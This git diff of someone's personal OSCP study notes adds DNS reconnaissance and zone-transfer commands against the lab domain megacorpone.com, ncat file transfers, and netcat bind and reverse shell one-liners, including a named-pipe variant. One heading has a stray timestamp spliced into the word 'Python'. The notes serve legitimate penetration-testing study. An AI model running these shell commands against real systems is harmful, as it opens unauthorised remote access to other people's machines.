@@ -6,15 +6,43 @@ in the name of Allah, the most gracful the most merciful
 ## Table of Content
 - [OSCP Journy - Yasser](#oscp-journy---yasser)
   - [Table of Content](#table-of-content)
+- [Terminology](#terminology)
 - [Linux](#linux)
 - [Windows](#windows)
 - [Enumration](#enumration)
+  - [OSINT](#osint)
   - [Port Scanning](#port-scanning)
 - [Buffer Over Flow](#buffer-over-flow)
-- [Privilege Escalation](#privilege-escalation)
+- [Post Exploitation](#post-exploitation)
+  - [Privilege Escalation](#privilege-escalation)
 - [VMware](#vmware)
-- [Python](#python)
+- [Pytho2019-05-23 01:45:00n](#pytho2019-05-23-014500n)
+- [Resources](#resources)
 - [## Diary](#diary)
+
+Terminology 
+==========================
+- bind shell    
+*listens, good if public IP available*      
+- reverse shell   
+*connects back*   
+- netcat vs ncat vs sbd   
+  - **netcat** ->  basic tcp and udp socket tool  
+  - **ncat** -> full featured network utility tool from nmap (supports encyptyion)  
+  - **sbd** -> clone of ncat, focuses on encryption and portability    
+- dns zone transfer    
+  *same like database replicatoin, it should be available/accessable for dns slaves only, but admins do not do that*
+- axfr   
+*dns zone transfer query*
+- connect scan 
+  * three way handshake scan * 
+- syn scan
+  * was used to bypass firewall logging, but not anymore with modern firewalls*
+- udp scan
+  * empty packet is sent, no response? open, icmp packet unreachable response? closed. weird * 
+- nmap tcp 65000 generated 4.5MB traffic, full subnet? around 1GB
+
+  
 
 
 Linux 
@@ -69,6 +97,24 @@ Windows
 Enumration 
 ==========================
 
+OSINT
+-----------------------
+
+- subdomain dns lookup      
+`for ip in $(cat brute.txt); do ping -c1 $ip.megacorpone.com; done`     
+- reverse dns     
+` for ip in $(seq 1 255); do host  38.100.193.$ip; done | grep -v "not found"`     
+
+- whois to find DNS Servers -> look for NS Servers       
+` whois megacorpone.com `      
+- try zone transfer with extracted DNS Servers     
+`host -l megacorpne.com NS2.megacorpone.com`     
+- dnsemum & dnsrecon    
+  *tools for automating dns zone transfrer*
+
+
+
+
 Port Scanning 
 ------------------------
 
@@ -115,13 +161,37 @@ Port Scanning
 
 
 
-Buffer Over Flow 
+Buffer Over Flow        
 ==========================
 
+
+Post Exploitation     
+==========================
+
+- File Trasnfer  
+  - ncat server 
+  `ncat -nlvp 444 > incoming.exe` 
+  - ncat client    
+  `ncat $ip 4444 < wget.exe`
+
+-  Shells
+  - bind shells
+    - nc server    
+    ` nc -nlvp 4444 -e cmd.exe`
+    - hacker 
+    ` nc $ip 4444`
+  - reverse shell    
+    - hacker 
+      ` nc -nlvp 4444`
+    - user 
+      `nc $ip 4444 -e /bin/bash`
+  - no -e option no problem 
+   `cat /tmp/f | cmd.exe -i 2>&1 | nc -l 4444 > /tmp/f  ` 
+
+   - ncat -- ssl option is awesome, it generates random key each time
 
 Privilege Escalation
-==========================
-
+----------------------------
 
 
 VMware
@@ -133,7 +203,7 @@ VMware
     `sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000`
 
 
-Python
+Pytho2019-05-23 01:45:00n
 ===========================
 
 - read from file and loop
@@ -144,9 +214,16 @@ for url in urls():
 ```
 
 
+Resources
+=========================
+- great structured general notes      
+  https://xapax.gitbooks.io/security/content/wireshark.html     
+- linux privilage escilation      
+http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/       
+- windows privlage escilation     
+http://www.fuzzysecurity.com/tutorials/16.html
 
-
-## Diary 
+## Diary        
 ===========================
 
 
@@ -160,7 +237,7 @@ vscode
 burp issur   
 soo much troubleshooting,    
 
-**2019-05-21 05:45:06  Day 2**  
+**2019-05-21 05:45:06  Day 2**   
 scripted networking confifurations,   
 started wrting notes,   
 started the pdf   
@@ -168,3 +245,5 @@ page 56/380 haha
 
 I feel pretty tired now, i need to sleep asap   
 alhamdulilah   
+
+**2019-05-22 05:06:52**
